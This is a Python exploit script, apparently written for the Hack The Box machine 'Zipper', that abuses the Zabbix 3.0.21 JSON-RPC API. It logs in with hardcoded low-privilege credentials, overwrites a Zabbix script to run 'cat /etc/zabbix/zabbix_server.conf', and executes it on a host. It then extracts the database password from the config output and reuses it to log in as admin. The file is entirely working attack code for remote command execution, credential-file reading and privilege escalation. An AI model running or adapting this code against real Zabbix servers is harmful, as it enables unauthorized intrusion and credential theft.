import requests
import json
import argparse


parser = argparse.ArgumentParser(description='Rce to Zabbix 3.0.21 from user (Zipper hackthebox)')
parser.add_argument("--hostname", default='http://10.10.10.108/zabbix', type=str, help="hostname of the box Zipper")
parser.add_argument("--username", default=None, type=str, help="Zabbix username")
parser.add_argument("--password", default=None, type=str, help="Zabbix password")
parser.add_argument("--hostId", default='10106', type=str, help="Your zabbix host id")

args = parser.parse_args()

zabbix_url = 'http://10.10.10.108/zabbix'
zabbix_api_target = zabbix_url + '/api_jsonrpc.php'

login = 'zapper'
password = 'zapper'
host_id = '10106'

auth_payload = {
    "jsonrpc": "2.0",
    "method": "user.login",
    "params": {
        'user': "" + login + "",
        'password': "" + password + "",
    },
    "auth": None,
    "id": 0,
}

headers = {
    'content-type': 'application/json',
}

auth = requests.post(zabbix_api_target, data=json.dumps(auth_payload), headers=(headers))
auth = auth.json()

auth_payload = {
    "jsonrpc": "2.0",
    "method": "script.update",
    "params": {
        "scriptid": "1",
        # "execute_on": 0,
        "command": "cat /etc/zabbix/zabbix_server.conf"
    },
    "auth": auth['result'],
    "id": 0,
}

cmd_upd = requests.post(zabbix_api_target, data=json.dumps(auth_payload), headers=(headers))
auth_payload = {
    "jsonrpc": "2.0",
    "method": "script.execute",
    "params": {
        "scriptid": "1",
        "hostid": "" + host_id + ""
    },
    "auth": auth['result'],
    "id": 0,
}

cmd_exe = requests.post(zabbix_api_target, data=json.dumps(auth_payload), headers=(headers))
cmd_exe = cmd_exe.json()
if "error" in cmd_exe:
    print(cmd_exe)
    exit()

command_result = cmd_exe["result"]["value"]
result = [line for line in command_result.split('\n') if "DBPassword" in line]
admin_password = result[2].split("=")[1]
print("Zabbix admin password: " + admin_password)

admin_payload = {
    "jsonrpc": "2.0",
    "method": "user.login",
    "params": {
        'user': "admin",
        'password': admin_password,
    },
    "auth": None,
    "id": 0,
}

auth = requests.post(zabbix_api_target, data=json.dumps(admin_payload), headers=(headers))
auth = auth.json()
if "error" in auth:
    print("Wrong admin password provided")
    exit()
print("Authenticated as admin")
